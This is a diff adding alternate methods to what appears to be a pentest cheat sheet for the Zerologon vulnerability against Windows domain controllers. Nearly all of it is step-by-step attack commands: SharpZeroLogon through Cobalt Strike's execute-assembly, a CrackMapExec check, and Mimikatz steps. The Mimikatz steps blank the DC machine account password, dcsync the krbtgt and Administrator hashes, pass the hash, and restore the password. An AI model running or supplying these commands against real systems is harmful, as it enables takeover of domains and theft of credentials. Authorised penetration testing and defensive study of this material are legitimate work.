@@ -17,3 +17,37 @@
 #### 5) python3 reinstall_original_pw.py NETBIOS_NAME DC_IP ORIGINAL_NTLM_ADMIN_HASH (Reinstalls the original password that the admin had to prevent permanent damage on the machine)
 
 ### TIP: The LM and NTLM hashes represented in the command are actually the hashed version of empty password/string
+
+## Alternate Method: nccfsas - .NET binary for Cobalt Strike's execute-assembly
+
+### Tools: https://github.com/nccgroup/nccfsas
+
+### Steps:
+
+#### 1) execute-assembly SharpZeroLogon.exe DOMAIN_CONTROLLER.LOCAL (Check)
+
+#### 2) execute-assembly SharpZeroLogon.exe DOMAIN_CONTROLLER.LOCAL -reset (Reset the machine account password)
+
+#### 3) execute-assembly SharpZeroLogon.exe DOMAIN_CONTROLLER.LOCAL -patch (Reset the password back)
+
+## Alternate Method: CrackMapExec (Only check)
+
+#### 1) crackmapexec smb DC_IP -u USERNAME -p PASSWORD -d DOMAIN -M zerologon
+
+## Alternate Method: Mimikatz - 2.2.0 20200917 Post-Zerologon
+
+### Steps:
+
+#### 1) privilege::Debug
+
+#### 2) lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ (Check for CVE)
+
+#### 3) lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit (Exploit the CVE and set the computer account's password to "")
+
+#### 4) lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ 
+
+#### lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ (Execute dcsync to extract some hashes)
+
+#### 5) sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN (Pass The Hash with the extracted Domain Admin hash)
+
+#### 6) lsadump::postzerologon /target:DC_IP /account:DC01$ (Reset password. Use IP address instead of FQDN to force NTLM with Windows APIs)
